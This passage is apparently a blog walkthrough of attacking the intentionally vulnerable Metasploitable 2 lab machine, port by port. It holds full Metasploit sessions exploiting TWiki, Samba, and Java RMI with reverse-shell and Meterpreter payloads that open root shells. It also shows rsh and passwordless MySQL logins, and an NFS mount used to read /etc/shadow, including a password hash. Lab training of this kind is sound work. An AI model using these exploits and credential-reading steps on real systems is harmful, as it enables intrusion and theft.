<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/telnet/telnet_version
</span><span class='line'>msf auxiliary(telnet_version) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/telnet/telnet_version):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   PASSWORD                   no        The password for the specified username
</span><span class='line'>   RHOSTS                     yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT     23               yes       The target port
</span><span class='line'>   THREADS   1                yes       The number of concurrent threads
</span><span class='line'>   TIMEOUT   30               yes       Timeout for the Telnet probe
</span><span class='line'>   USERNAME                   no        The username to authenticate as
</span><span class='line'>
</span><span class='line'>msf auxiliary(telnet_version) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(telnet_version) &gt; run
</span><span class='line'>
</span><span class='line'>[*] 192.168.127.154:23 TELNET _                  _       _ _        _     _      ____  \x0a _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ \x0a| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |\x0a| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ \x0a|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|\x0a                            |_|                                          \x0a\x0a\x0aWarning: Never expose this VM to an untrusted network!\x0a\x0aContact: msfdev[at]metasploit.com\x0a\x0aLogin with msfadmin/msfadmin to get started\x0a\x0a\x0ametasploitable login:
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>So now we know the credentials for the msfadmin account, and if you log in and play around you will find out that this accound has sudo privilege, so it&rsquo;s possible to run commands as root.</p>

<h3>Port 80 apache</h3>

<p>Navigating to the root of the web server, we can see some vulnerable web applications, along with the msfadmin account details which we got earlier with telnet. I won&rsquo;t go over the web applications here, because I am focusing on host based exploitation in this post. However, I found out that I could use Metasploit against one of them to get a shell, so I will detail that here.</p>

<p>The Nessus scan revealed that the TWiki web application is vulnerable to remote code execution. I found the following suitable exploit:</p>

<p><strong>TWiki History TWikiUsers rev Parameter Command Execution</strong></p>

<blockquote><p>This module exploits a vulnerability in the history component of TWiki. By passing a &lsquo;rev&rsquo; parameter containing shell metacharacters to the
TWikiUsers script, an attacker can execute arbitrary OS commands.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/webapp/twiki_history
</span><span class='line'>msf exploit(twiki_history) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/webapp/twiki_history):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   Proxies                   no        Use a proxy chain
</span><span class='line'>   RHOST                     yes       The target address
</span><span class='line'>   RPORT    80               yes       The target port
</span><span class='line'>   URI      /twiki/bin       yes       TWiki bin directory path
</span><span class='line'>   VHOST                     no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(twiki_history) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(twiki_history) &gt; set payload cmd/unix/reverse 
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(twiki_history) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo ZeiYbclsufvu4LGM;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Successfully sent exploit request
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "ZeiYbclsufvu4LGM\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo D0Yvs2n6TnTUDmPF;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Command shell session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.154:54381) at 2014-06-08 17:31:48 +0300
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "D0Yvs2n6TnTUDmPF\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p>This is a low privilege shell, but we can escalate to root via the udev exploit, as shown later.</p>

<h3>Port 445 samba</h3>

<p>First, I&rsquo;ll use an auxiliary module to get the server&rsquo;s version:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/smb/smb_version
</span><span class='line'>msf auxiliary(smb_version) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/smb/smb_version):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   RHOSTS                      yes       The target address range or CIDR identifier
</span><span class='line'>   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
</span><span class='line'>   SMBPass                     no        The password for the specified username
</span><span class='line'>   SMBUser                     no        The username to authenticate as
</span><span class='line'>   THREADS    1                yes       The number of concurrent threads
</span><span class='line'>
</span><span class='line'>msf auxiliary(smb_version) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(smb_version) &gt; run
</span><span class='line'>
</span><span class='line'>[*] 192.168.127.154:445 is running Unix Samba 3.0.20-Debian (language: Unknown) (domain:WORKGROUP)
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>With that information in hand, we can now use a suitable exploit against the target:</p>

<p><strong>Samba &ldquo;username map script&rdquo; Command Execution</strong></p>

<blockquote><p>This module exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default &ldquo;username map
script&rdquo; configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No
authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/samba/usermap_script
</span><span class='line'>msf exploit(usermap_script) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/samba/usermap_script):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  139              yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(usermap_script) &gt; set payload cmd/unix/reverse
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(usermap_script) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/samba/usermap_script):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  192.168.127.154  yes       The target address
</span><span class='line'>   RPORT  139              yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (cmd/unix/reverse):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST                   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(usermap_script) &gt; set RPORT 445
</span><span class='line'>RPORT =&gt; 445
</span><span class='line'>msf exploit(usermap_script) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo f8rjvIDZRdKBtu0F;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "f8rjvIDZRdKBtu0F\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:46653) at 2014-06-04 22:23:23 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root
</span></code></pre></td></tr></table></div></figure>


<h3>Port 514 tcpwrapped</h3>

<p>The nmap scan revealed the port is open but it&rsquo;s tcpwrapped. Let&rsquo;s first see what that means:</p>

<blockquote><p>TCP Wrapper is a host-based networking access control list system, used to filter network access to Internet Protocol servers on (Unix-
like) operating systems such as Linux or BSD.  (Wikipedia)</p></blockquote>

<p>So we can conclude the port is protected by TCP Wrapper. If we try to netcat to the port, we see this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vvn 192.168.127.154 514
</span><span class='line'>
</span><span class='line'>(UNKNOWN) [192.168.127.154] 514 (shell) open</span></code></pre></td></tr></table></div></figure>


<p>I ran a Nessus scan against the target, and according to the report, a critical vulnerability is present on this port:</p>

<p><strong>rsh Unauthenticated Access (via finger Information)</strong></p>

<p><strong>Synopsis</strong></p>

<p>It was possible to log on this machine without password.</p>

<p><strong>Description</strong></p>

<p>Using common usernames as well as the usernames reported by &lsquo;finger&rsquo;, Nessus was able to log in through rsh. Either the accounts are not protected by passwords or the ~/.rhosts files are not configured properly.</p>

<p>This vulnerability is confirmed to exist in Cisco Prime LAN Management Solution, but could be present on any host that is not securely configured.</p>

<p><strong>Port</strong><br/>
tcp/514</p>

<p>So all we have to do is log in via the remote shell program:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsh 192.168.127.154
</span><span class='line'>
</span><span class='line'>Last login: Wed May  7 11:00:37 EDT 2014 from :0.0 on pts/0
</span><span class='line'>
</span><span class='line'>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>To access official Ubuntu documentation, please visit:
</span><span class='line'>
</span><span class='line'>http://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>You have mail.
</span><span class='line'>
</span><span class='line'>root@metasploitable:~#</span></code></pre></td></tr></table></div></figure>


<h3>Port 1099 java-rmi</h3>

<p>Let&rsquo;s continue our exploitation. Anything labeled Java is bound to be interesting from a security perspective :)</p>

<p>Searching for Java exploits yielded something interesting:</p>

<p><strong>Java RMI Server Insecure Default Configuration Java Code Execution</strong></p>

<blockquote><p>This module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from
any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be
used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java
Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java
process. RMI method calls do not support or require any sort of authentication.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/misc/java_rmi_server  
</span><span class='line'>msf exploit(java_rmi_server) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/misc/java_rmi_server):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   RHOST                     yes       The target address
</span><span class='line'>   RPORT    1099             yes       The target port
</span><span class='line'>   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT  8080             yes       The local port to listen on.
</span><span class='line'>   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   URIPATH                   no        The URI to use for this exploit (default is random)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Generic (Java Payload)
</span><span class='line'>
</span><span class='line'>msf exploit(java_rmi_server) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>
</span><span class='line'>msf exploit(java_rmi_server) &gt; set payload java/meterpreter/reverse_tcp
</span><span class='line'>payload =&gt; java/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(java_rmi_server) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/misc/java_rmi_server):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   RHOST    192.168.127.154  yes       The target address
</span><span class='line'>   RPORT    1099             yes       The target port
</span><span class='line'>   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT  8080             yes       The local port to listen on.
</span><span class='line'>   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   URIPATH                   no        The URI to use for this exploit (default is random)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (java/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST                   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Generic (Java Payload)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(java_rmi_server) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(java_rmi_server) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] Using URL: http://0.0.0.0:8080/oVUJAkfU
</span><span class='line'>[*]  Local IP: http://192.168.127.159:8080/oVUJAkfU
</span><span class='line'>[*] Connected and sending request for http://192.168.127.159:8080/oVUJAkfU/WAHKp.jar
</span><span class='line'>[*] 192.168.127.154  java_rmi_server - Replied to request for payload JAR
</span><span class='line'>[*] Sending stage (30355 bytes) to 192.168.127.154
</span><span class='line'>[*] Meterpreter session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.154:36965) at 2014-06-04 22:42:17 +0300
</span><span class='line'>[+] Target 192.168.127.154:1099 may be exploitable...
</span><span class='line'>[*] Server stopped.
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: root
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<h3>Port 1524 shell</h3>

<p>Well, not much to say here. There&rsquo;s already a nice, cozy shell waiting for connections, so nothing extra needs to be done.</p>

<h3>Port 2049 nfs</h3>

<p>Let&rsquo;s use the the <strong>showmount</strong> command to see the NFS server&rsquo;s export list. This command displays mount information for an NFS server. The -e flag is for showing exports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>showmount -e 192.168.127.154
</span><span class='line'>
</span><span class='line'>Export list for 192.168.127.154:
</span><span class='line'>
</span><span class='line'>/ *</span></code></pre></td></tr></table></div></figure>


<p>How nice! The root directory is shared. So, let&rsquo;s mount it then:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /metafs # this will be the mount point
</span><span class='line'>
</span><span class='line'>mount -t nfs 192.168.127.154:/ /metafs -o nolock # mount the remote shared directory as nfs and disable file locking</span></code></pre></td></tr></table></div></figure>


<p>Now we can read  the passwords and everything else:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /metafs/etc/shadow
</span><span class='line'>
</span><span class='line'>root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
</span><span class='line'>
</span><span class='line'>..........etc..........</span></code></pre></td></tr></table></div></figure>


<h3>Port 3306 mysql</h3>

<p>The Nessus scan that I ran against the target revealed the following:</p>

<p><strong>MySQL Unpassworded Account Check</strong></p>

<p><strong>Synopsis</strong></p>

<p>The remote database server can be accessed without a password.</p>

<p><strong>Description</strong></p>

<p>It is possible to connect to the remote MySQL database server using an unpassworded account. This may allow an
attacker to launch further attacks against the database.</p>

<p>The &lsquo;root&rsquo; account does not have a password.
Here is the list of databases on the remote server :
&ndash; information_schema
&ndash; dvwa
&ndash; metasploit
&ndash; mysql
&ndash; owasp10
&ndash; tikiwiki
&ndash; tikiwiki195</p>

<p>Let&rsquo;s see if we can indeed connect to the database as root without a password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql -u root -p -h 192.168.127.154
</span><span class='line'>Enter password: 
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 7
</span><span class='line'>Server version: 5.0.51a-3ubuntu5 (Ubuntu)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>


<p>Now we can look inside the databases and get any data that might interest us.</p>

<h3>Port 3632 distccd</h3>

<p>distccd  is  the  server  for  the  distcc distributed compiler. It accepts and runs compilation jobs for network clients. Metasploit has an exploit avaiable for this:</p>

<p><strong>DistCC Daemon Command Execution</strong></p>

<blockquote><p>This module uses a documented security weakness to execute arbitrary commands on any system running distccd.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
